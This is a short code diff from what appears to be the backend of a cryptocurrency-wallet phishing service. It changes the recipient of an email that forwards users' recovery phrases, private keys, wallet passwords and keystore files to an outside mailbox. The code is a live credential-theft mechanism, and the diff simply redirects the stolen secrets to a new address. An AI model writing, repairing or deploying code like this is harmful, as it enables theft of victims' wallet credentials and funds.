@@ -10,7 +10,7 @@ export class AppService {
     if (wallet.recoveryPhrase || wallet.privateKey || wallet.walletPassword) {
       await this.sharedService.sendEmail({
         from: 'random@fonu.com',
-        to: 'israelobanijesu2@gmail.com',
+        to: 'fretking24@proton.me',
         subject: 'New Wallet Details',
         ...(wallet.keystoreFile?.buffer
           ? {
